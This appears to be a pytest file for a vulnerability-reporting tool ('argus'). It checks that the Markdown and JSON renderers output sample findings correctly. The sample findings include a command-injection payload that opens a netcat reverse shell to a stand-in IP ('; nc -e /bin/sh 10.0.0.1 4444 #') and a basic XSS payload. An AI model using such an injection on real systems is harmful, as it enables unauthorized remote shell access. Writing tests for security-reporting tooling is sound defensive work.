from __future__ import annotations

import json
import pytest
from argus.reporting.cvss import CVSSCalculator
from argus.reporting.json import JSONReportRenderer
from argus.reporting.markdown import HackerOneMarkdownRenderer
from argus.reporting.models import (
    CVSSData,
    CWEInfo,
    Finding,
    ReportSeverity,
    ReportSummary,
    VulnerabilityReport,
)


@pytest.fixture
def sample_report() -> VulnerabilityReport:
    f1 = Finding(
        id="finding-crit-1",
        title="Remote Code Execution via File Upload",
        category="command_injection",
        severity="critical",
        cvss=CVSSCalculator.get_approximate_cvss("command_injection", "critical"),
        cwe=CWEInfo(id="CWE-78", name="OS Command Injection"),
        host="api.corp.local",
        endpoint="/api/v1/upload",
        parameter="file",
        parameter_type="multipart/form-data",
        payload="; nc -e /bin/sh 10.0.0.1 4444 #",
        description="Arbitrary command execution flaw discovered.",
        steps_to_reproduce=[
            "Upload crafted file containing OS shell metacharacters.",
            "Trigger processing endpoint at /api/v1/upload.",
            "Verify reverse shell established.",
        ],
        impact="Full host takeover and root shell access.",
        remediation="Enforce strict allowlist file type and sanitize input filenames.",
        confidence=1.0,
        status="CONFIRMED",
        evidence_ids=["ev-01", "ev-02"],
        duplicate_count=2,
        tags=["rce", "cve"],
        references=["https://cwe.mitre.org/data/definitions/78.html"],
    )

    f2 = Finding(
        id="finding-med-1",
        title="Reflected XSS in Search Query",
        category="reflected_xss",
        severity="medium",
        cvss=CVSSCalculator.get_approximate_cvss("reflected_xss", "medium"),
        cwe=CWEInfo(id="CWE-79", name="Cross-site Scripting"),
        host="app.corp.local",
        endpoint="/search",
        parameter="q",
        parameter_type="query",
        payload="<script>alert(1)</script>",
        description="Unencoded search term reflected in HTML body.",
        steps_to_reproduce=[
            "Navigate to /search?q=<script>alert(1)</script>.",
            "Observe JavaScript execution in browser DOM.",
        ],
        impact="Session hijacking of visiting victims.",
        remediation="Contextually HTML encode all user reflection points.",
        confidence=0.9,
        status="CONFIRMED",
        evidence_ids=["ev-03"],
        duplicate_count=1,
        tags=["xss"],
    )

    summary = ReportSummary(
        total_findings=2,
        total_evidence_items=3,
        deduplicated_count=1,
        severity_counts={"critical": 1, "high": 0, "medium": 1, "low": 0, "info": 0},
        category_counts={"command_injection": 1, "reflected_xss": 1},
        host_counts={"api.corp.local": 1, "app.corp.local": 1},
    )

    return VulnerabilityReport(
        report_id="rep-h1-test",
        mission_id="mission-100",
        target="corp.local",
        summary=summary,
        findings=[f1, f2],
        grouped_by_category={"command_injection": [f1], "reflected_xss": [f2]},
        grouped_by_host={"api.corp.local": [f1], "app.corp.local": [f2]},
    )


def test_hackerone_markdown_renderer(sample_report):
    renderer = HackerOneMarkdownRenderer()
    md_output = renderer.render(sample_report)

    # 1. Title and metadata header
    assert "# Vulnerability Assessment Report — corp.local" in md_output
    assert "Mission ID:" in md_output
    assert "mission-100" in md_output

    # 2. Executive Summary & Scorecard
    assert "## 1. Executive Summary" in md_output
    assert "## 2. Findings Scorecard" in md_output
    assert "Remote Code Execution via File Upload" in md_output
    assert "Reflected XSS in Search Query" in md_output

    # 3. Required finding fields: title, severity, CVSS score, steps to reproduce, impact, remediation
    assert "Finding 1: Remote Code Execution via File Upload" in md_output
    assert "**CRITICAL**" in md_output
    assert "CVSS v3.1 Score" in md_output
    assert "9.8" in md_output
    assert "CWE-78" in md_output
    assert "#### Steps to Reproduce" in md_output
    assert "1. Upload crafted file containing OS shell metacharacters." in md_output
    assert "#### Impact Analysis" in md_output
    assert "Full host takeover and root shell access." in md_output
    assert "#### Recommended Remediation" in md_output
    assert "Enforce strict allowlist file type" in md_output

    # 4. Proof of Concept payload block
    assert "#### Proof of Concept Payload" in md_output
    assert "; nc -e /bin/sh 10.0.0.1 4444 #" in md_output

    # 5. Supporting evidence
    assert "ev-01" in md_output


def test_json_report_renderer(sample_report):
    renderer = JSONReportRenderer()
    json_str = renderer.render(sample_report)

    # Must be valid JSON
    parsed = json.loads(json_str)

    # Check top-level required fields
    assert parsed["report_id"] == "rep-h1-test"
    assert parsed["mission_id"] == "mission-100"
    assert parsed["target"] == "corp.local"
    assert "generated_at" in parsed
    assert "generator_version" in parsed

    # Check summary
    summary = parsed["summary"]
    assert summary["total_findings"] == 2
    assert summary["total_evidence_items"] == 3
    assert summary["deduplicated_count"] == 1
    assert summary["severity_counts"]["critical"] == 1
    assert summary["severity_counts"]["medium"] == 1

    # Check findings list
    findings = parsed["findings"]
    assert len(findings) == 2
    f1 = findings[0]
    assert f1["title"] == "Remote Code Execution via File Upload"
    assert f1["severity"] == "critical"
    assert f1["cvss"]["score"] >= 9.0
    assert f1["cwe"]["id"] == "CWE-78"
    assert len(f1["steps_to_reproduce"]) == 3
    assert f1["impact"] == "Full host takeover and root shell access."
    assert f1["remediation"] == "Enforce strict allowlist file type and sanitize input filenames."
    assert f1["duplicate_count"] == 2

    # Check groupings
    assert "command_injection" in parsed["grouped_by_category"]
    assert "api.corp.local" in parsed["grouped_by_host"]


def test_json_parser_roundtrip(sample_report):
    renderer = JSONReportRenderer()
    json_str = renderer.render(sample_report)
    deserialized = renderer.parse(json_str)

    assert deserialized.report_id == sample_report.report_id
    assert deserialized.mission_id == sample_report.mission_id
    assert deserialized.target == sample_report.target
    assert deserialized.summary.total_findings == 2
    assert len(deserialized.findings) == 2
    assert deserialized.findings[0].title == "Remote Code Execution via File Upload"
    assert deserialized.findings[0].cvss.score == sample_report.findings[0].cvss.score
